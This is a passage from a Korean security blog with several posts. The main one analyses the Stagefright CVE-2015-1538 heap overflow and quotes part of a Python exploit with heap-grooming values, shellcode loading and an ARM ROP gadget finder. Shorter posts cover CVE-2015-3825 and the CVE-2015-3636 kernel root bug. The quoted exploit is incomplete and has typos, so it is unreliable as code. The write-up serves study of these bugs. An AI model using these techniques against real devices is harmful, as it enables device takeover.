-<p>어쨌든, 이제 exploit 을 만들기 위해서 몇가지 primitive 들이 필요하다고 한다. 그 첫번째는 memory alloc primitive 라고 하는데. Memory corruption 에서 memory alloc primitive 가 필요한 이유는 대부분의 경우, fragmented 된 영역을 채워버려서 메모리 상태를 좀 더 관리된 상태로 만들고 싶을 때이다.</p>
-
-<p>저자는 <code>pssh</code> box 를 이용하면 필요할 때 memory alloc 을 할 수 있다고 한다. <code>new</code> 로 들어가는 memory alloc 되는 버퍼의 length, 내용을 control 할 수 있다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('p','s','s','h'):
-</span><span class='line'>{
-</span><span class='line'>    *offset += chunk_size;
-</span><span class='line'>    PsshInfo pssh;
-</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 4, &pssh.uuid, 16) &lt; 16) {
-</span><span class='line'>        return ERROR_IO;
-</span><span class='line'>    }
-</span><span class='line'>    uint32_t psshdatalen = 0;
-</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 20, &psshdatalen, 4) &lt; 4) {
-</span><span class='line'>        return ERROR_IO;
-</span><span class='line'>    }
-</span><span class='line'>    // pssh.datalen is set to a size we control
-</span><span class='line'>    pssh.datalen = ntohl(psshdatalen);
-</span><span class='line'>    ALOGV("pssh data size: %d", pssh.datalen);
-</span><span class='line'>    if (pssh.datalen + 20 &gt; chunk_size) {
-</span><span class='line'>        // pssh data length exceeds size of containing box
-</span><span class='line'>        return ERROR_MALFORMED;
-</span><span class='line'>    }
-</span><span class='line'>    // pssh.data is an allocated block of memory of a size we control
-</span><span class='line'>    pssh.data = new (std::nothrow) uint8_t[pssh.datalen];
-</span><span class='line'>    if (pssh.data == NULL) {
-</span><span class='line'>        return ERROR_MALFORMED;
-</span><span class='line'>    }
-</span><span class='line'>    ALOGV("allocated pssh @ %p", pssh.data);
-</span><span class='line'>    ssize_t requested = (ssize_t) pssh.datalen;
-</span><span class='line'>    // now we read data we control into that allocation
-</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 24, pssh.data, requested) &lt; requested) {
-</span><span class='line'>        return ERROR_IO;
-</span><span class='line'>    }
-</span><span class='line'>    // and store it, so the allocation lives for the lifetime of our MPEG4Extractor
-</span><span class='line'>    // (these pssh blocks are in fact released in the destructor for the MPEG4Extractor)
-</span><span class='line'>    mPssh.push_back(pssh);
-</span><span class='line'>    break;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><code>pssh.data = new (std::nothrow) uint8_t[pssh.datalen];</code> 로 memory alloc 을.</li>
-<li><code>mDataSource-&gt;readAt()</code> 으로 alloc 한 memory 에 read 를 한다.</li>
-<li>memory size 나 메모리에 들어가는 data 는 해커가 control 할 수 있다.</li>
-</ul>
-
-
-<p>이제 두번째 primitive 가 필요하다고 하는데,</p>
-
-<p>두번째 primitive 는 <code>avcC</code> 를 이용한 것인데, 이 box 를 처음만나게 되면, 파서는 메모리를 alloc 하고 내용을 저장 -> 두번째 만나면 replace &amp; release 한다고.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('a', 'v', 'c', 'C'):
-</span><span class='line'>{
-</span><span class='line'>    *offset += chunk_size;
-</span><span class='line'>    sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size);
-</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) {
-</span><span class='line'>        return ERROR_IO;
-</span><span class='line'>    }
-</span><span class='line'>    // this internally copies buffer-&gt;data() into a buffer of a size chunk_data_size, and
-</span><span class='line'>    // releases the previously stored data.
-</span><span class='line'>    mLastTrack-&gt;meta-&gt;setData(hKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);
-</span><span class='line'>    break;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><code>this internally copies buffer-&gt;data() into a buffer of a size chunk_data_size, and releases the previously stored data.</code></li>
-</ul>
-
-
-<p>이건 setData() 를 좀 봐야할 듯.</p>
-
-<p>어쨌든, 블로그에 따르면 excution control 을 가져오는 전술은, overflow 가 일어나서 MPEG4DataSource C++ object 를 overwrite 하는 시나리오를 만드는 것. MPEG4DataSource 를 alloc 하는 박스는 <code>stbl</code> 박스.</p>
-
-<p>사용하는 primitvie 들을 정리하면,</p>
-
-<ul>
-<li>Integer overflow 가 있는 박스는 <code>tx3g</code></li>
-<li>Memory alloc 을 하는 것은 <code>pssh</code></li>
-<li>Corrupt 될 object 를 alloc 하는 것은 <code>stbl</code></li>
-<li>Memory alloc &amp; release 를 하는 것은 <code>avcC</code> &amp; <code>hvcC</code></li>
-</ul>
-
-
-<p>시나리오는 다음과 같다고 한다.</p>
-
-<ul>
-<li>chunk_size 를 크게 만들어서 lhs 를 minus 로 만들어서 check 를 뚫는다.</li>
-<li>chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소되고.</li>
-<li>buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.</li>
-<li>buffer 는 32 바이트 alloc 되는데, read 는 32 바이트 이상된다.</li>
-<li><code>memcpy()</code> 에서 buffer 뒤에 위치한 MPEG4Source 오브젝트의 vtable 이 오염된다.</li>
-<li><code>mDataSource-&gt;readAt()</code> 으로 control flow 가 튀게 된다.</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('t', 'x', '3', 'g'):
-</span><span class='line'>{
-</span><span class='line'>    uint32_t type;
-</span><span class='line'>    const void *data;
-</span><span class='line'>    size_t size = 0;
-</span><span class='line'>    if (!mLastTrack-&gt;meta-&gt;findData(kKeyTextFormatData, &type, &data, &size)) {
-</span><span class='line'>        size = 0;
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    // chunk_size 를 크게 만들어서 lhs 를 minus 를 만들어서 check 를 뚫는다.
-</span><span class='line'>    if (SIZE_MAX - chunk_size &lt;= size) {
-</span><span class='line'>        return ERROR_MALFORMED;
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    // chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소.
-</span><span class='line'>    // overflow here, so that size + chunk_size == 32 and size &gt; 32
-</span><span class='line'>    uint*_t *buffer = new uint8_t[size + chunk_size];
-</span><span class='line'>
-</span><span class='line'>    // buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.
-</span><span class='line'>    // buffer is allocated immediately before mDataSource
-</span><span class='line'>    if (size &gt; 0) {
-</span><span class='line'>        // 여기서 MPEG4DataSource 오브젝트의 vtable 을 커럽트 시킨다고 한다.
-</span><span class='line'>        // this will overflow and corrupt the mDataSource vtable
-</span><span class='line'>        memcpy(buffer, data, size);
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    // vtable 를 참조하게 되어서 control flow 가 튀게된다고 한다.
-</span><span class='line'>    // this call goes through the corrupt vtable, and we get control of execution
-</span><span class='line'>    if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size)) &lt; chunk_size) {
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>그러면 이 시나리오를 만들기 위해서 어떻게 box 들을 배치해야 할까?</p>
-
-<ul>
-<li>16 bytes 의 <code>avcC</code></li>
-<li>16 bytes 의 <code>hvcC</code></li>
-</ul>
-
-
-<h4>Mark Brand&rsquo;s Exploit</h4>
-
-<p>돌아다니는 exploit 에는 2 가지가 있는데, Zimperium 코드랑 Mark Brand 가 쓴 파이썬 코드.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-<span class='line-number'>120</span>
-<span class='line-number'>121</span>
-<span class='line-number'>122</span>
-<span class='line-number'>123</span>
-<span class='line-number'>124</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python2
-</span><span class='line'>
-</span><span class='line'>import cherrypy
-</span><span class='line'>import os
-</span><span class='line'>import pwnlib.asm as asm
-</span><span class='line'>import pwnlib.elf as elf
-</span><span class='line'>import sys
-</span><span class='line'>import struct
-</span><span class='line'>
-</span><span class='line'>with open('shellcode.bin', 'rb') as tmp:
-</span><span class='line'>    shellcode = tmp.read()
-</span><span class='line'>
-</span><span class='line'>while len(shellcode) % 4 != 0:
-</span><span class='line'>    shellcode += '\x00'
-</span><span class='line'>
-</span><span class='line'># heap grooming configuration
-</span><span class='line'>alloc_size = 0x20
-</span><span class='line'>groom_count = 0x4
-</span><span class='line'>spray_size = 0x10000
-</span><span class='line'>spray_count = 0x10
-</span><span class='line'>
-</span><span class='line'># address of the buffer we allocate for our shellcode
-</span><span class='line'>mmap_address = 0x90000000
-</span><span class='line'>
-</span><span class='line'># addresses that we need to predict
-</span><span class='line'>libc_base = 0xb6ebd000
-</span><span class='line'>spray_address = 0xb3000000
-</span><span class='line'>
-</span><span class='line'># ROP gadget addresses
-</span><span class='line'>stack_pivot = None
-</span><span class='line'>pop_pc = None
-</span><span class='line'>pop_r0_r1_r2_r3_pc = None
-</span><span class='line'>pop_r4_r5_r6_r7_pc = None
-</span><span class='line'>ldr_lr_bx_lr = None
-</span><span class='line'>ldr_lr_bx_lr_stack_pad = 0
-</span><span class='line'>mmap64 = None
-</span><span class='line'>memcpy = None
-</span><span class='line'>
-</span><span class='line'>def find_arm_gadget(e, gadget):
-</span><span class='line'>    gadget_bytes = asm.asm(gadget, arch='arm')
-</span><span class='line'>    gadget_address = None
-</span><span class='line'>    for address in e.search(gadget_bytes):
-</span><span class='line'>        if address % 4 == 0:
-</span><span class='line'>            gadget_address = address
-</span><span class='line'>            if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
-</span><span class='line'>                print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
-</span><span class='line'>                break
-</span><span class='line'>    return gadget_address
-</span><span class='line'>
-</span><span class='line'>def find_thumb_gadget(e, gadget):
-</span><span class='line'>    gadget_bytes = asm.asm(gadget, arch='thumb')
-</span><span class='line'>    gadget_address = None
-</span><span class='line'>    for address in e.search(gadget_bytes):
-</span><span class='line'>        if address % 2 == 0:
-</span><span class='line'>            gadget_address = address + 1
-</span><span class='line'>            if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
-</span><span class='line'>                print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
-</span><span class='line'>                break
-</span><span class='line'>    return gadget_address
-</span><span class='line'>
-</span><span class='line'>def find_gadget(e, gadget):
-</span><span class='line'>    gadget_address = find_thumb_gadget_e, gadget)
-</span><span class='line'>    if gadget_address is not None:
-</span><span class='line'>        return gadget_address
-</span><span class='line'>    return find_arm_gadget(e, gadget)
-</span><span class='line'>
-</span><span class='line'>def find_rop_gadgets(path):
-</span><span class='line'>    global memcpy
-</span><span class='line'>    global mmap64
-</span><span class='line'>    global stack_pivot
-</span><span class='line'>    global pop_pc
-</span><span class='line'>    global pop_r0_r1_r2_r3_pc
-</span><span class='line'>    global pop_r4_r5_r6_r7_pc
-</span><span class='line'>    global ldr_lr_bx_lr
-</span><span class='line'>    global ldr_ldr_bx_lr_stack_pad
-</span><span class='line'>
-</span><span class='line'>    e = elf.ELF(path)
-</span><span class='line'>    e.address = libc_base
-</span><span class='line'>
-</span><span class='line'>    memcpy = e.symbols['memcpy']
-</span><span class='line'>    print '[*] memcpy : 0x{:08x}'.format(memcpy)
-</span><span class='line'>    mmap64 = e.symbols['mmap64']
-</span><span class='line'>    print '[*] mmap64 : 0x{:08x}'.format(mmap64)
-</span><span class='line'>
-</span><span class='line'>    # ADD       R2, R0, #0x4C
-</span><span class='line'>    # LDMIA     R2, {R4-LR}
-</span><span class='line'>    # TEQ       SP, #0
-</span><span class='line'>    # TEQNE     LR, #0
-</span><span class='line'>    # BEQ       botch_0
-</span><span class='line'>    # MOV       R0, R1
-</span><span class='line'>    # TEQ       R0, #0
-</span><span class='line'>    # MOVEQ     R0, #1
-</span><span class='line'>    # BX        LR
-</span><span class='line'>
-</span><span class='line'>    pivot_asm = ''
-</span><span class='line'>    pivot_asm += 'add   r2, r0, #0x4c\n'
-</span><span class='line'>    pivot_asm += 'ldmia r2, {r4 - lr}\n'
-</span><span class='line'>    pivot_asm += 'teq   sp, #0\n'
-</span><span class='line'>    pivot_asm += 'teqne lr, #0'
-</span><span class='line'>    stack_pivot = find_arm_gadget(e, pivot_asm)
-</span><span class='line'>    print '[*] stack_pivot : 0x{:08x}.format(stack_pivot)
-</span><span class='line'>
-</span><span class='line'>    pop_pc_asm = 'pop {pc}'
-</span><span class='line'>    pop_pc = find_gadget(e, pop_pc_asm)
-</span><span class='line'>    print '[*] pop_pc : 0x{:08x}'.format(pop_pc)
-</span><span class='line'>
-</span><span class='line'>    pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
-</span><span class='line'>    print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)
-</span><span class='line'>
-</span><span class='line'>    pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
-</span><span class='line'>    print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)
-</span><span class='line'>
-</span><span class='line'>    ldr_lr_bx_lr_stack_pad = 0
-</span><span class='line'>    for i in range(0, 0x100, 4):
-</span><span class='line'>        ldr_lr_bx_lr_asm = 'ldr lr, [sp, #0x{:08x}]\n'.format(i)
-</span><span class='line'>        ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
-</span><span class='line'>        ldr_lr_bx_lr_asm += 'bx lr'
-</span><span class='line'>        ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
-</span><span class='line'>        if ldr_lr_bx_lr is not None:
-</span><span class='line'>            ldr_lr_bx_lr_stack_pad = i
-</span><span class='line'>            break
-</span><span class='line'>
-</span><span class='line'>    def pad(size):
-</span><span class='line'>        return '#' * size</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Zimperium Exploit</h4>
-
-<p>Joshua Drake 가 <a href="https://raw.githubusercontent.com/jduck/cve-2015-1538-1/master/Stagefright_CVE-2015-1538-1_Exploit.py">exploit</a> 을 공개했다. 분석해본다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/13/0-day-deserialization-vulnerabilities-in-android/">0-day Deserialization Vulnerabilities in Android</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-09-13T20:53:16+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:53 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>WOOT15 에 나온 <a href="https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf">One Class to Rule Them All: 0-day Deserialization Vulnerabilities in Android</a> 를 읽고 정리해본다.</p>
-
-<p>저자는 IBM Security 의 Or Peles, Rose Hay.</p>
-
-<h4>CVE-2015-3825</h4>
-
-<p>저자들이 찾은 버그는 <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2015-3825">CVE-2015-3825</a> 를 할당받았다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/02/own-your-android-yet-another-universal-root/">Own Your Android! Yet Another Universal Root</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-09-02T09:26:22+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>9:26 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>BlackHat 2015 에 발표된 Own your Android! Yet Another Universal Root, Wen Xu, Yubin Fu. 를 정리해본다.</p>
-
-<p><a href="https://www.youtube.com/watch?v=HVP1c7Ct1nM">BlackHat 발표 영상</a></p>
-
-<h4>Bug analysis</h4>
-
-<ul>
-<li>CVE-2015-3636: Wen Yu 와 wushi (of Keen Team) 이 <a href="https://github.com/kernelslacker/trinity">Trinity fuzzer</a> 로 찾음.</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Paging fault # virtual address 00200200.
-</span><span class='line'>PC is at ping_unhash+0x50/0xd4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>ICMP Ping 을 할 때 지나가는 코드인 것 같은데.</p>
-
-<p><code>socket(AF_INET, SOCK_DGRAM, IP_PROTO_ICMP)</code> 를 할 경우에 다음과 같은 코드를 지나간다고 한다.</p>
-
-<figure class='code'><figcaption><span>net/ipv4/af_inet.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">inet_dgram_connect</span><span class="p">(</span><span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">addr_len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">addr_len</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span><span class="p">))</span>
-</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_UNSPEC</span><span class="p">)</span>
-</span><span class='line'>        <span class="k">return</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="o">-&gt;</span><span class="n">disconnect</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Socket 의 어드레스 패밀리가 unspecified 일 경우, <code>disconnect()</code> 를 호출하는데, PING (ICMP) 의 경우 불리는 함수는 <code>udp_disconnect()</code>.</p>
-
-<figure class='code'><figcaption><span>udp_disconnect()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">udp_disconnect</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">inet</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_state</span> <span class="o">=</span> <span class="n">TCP_CLOSE</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_userlocks</span> <span class="o">&amp;</span> <span class="n">SOCK_BINDPORT_LOCK</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_proto</span><span class="o">-&gt;</span><span class="n">unhash</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">inet</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="n">sk_dst_reset</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">udp_disconnect</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>여기서 <code>sk_prot-&gt;unhash(sk)</code> 를 호출하는데, 그러면 <code>ping_unhash()</code> 가 호출된다.</p>
-
-<p><code>sk_hashed(sk)</code> 로 socket 이 hashed 되어있는지 확인하고, TRUE 라면 sk_nulls_node 를 지운다.</p>
-
-<figure class='code'><figcaption><span>ping_unhash()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">ping_unhash</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">isk</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">pr_debug</span><span class="p">(</span><span class="s">&quot;ping_unhash(isk=%p,isk-&gt;num=%u)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">isk</span><span class="p">,</span> <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span><span class="p">);</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">sk_hashed</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span> <span class="p">{</span>
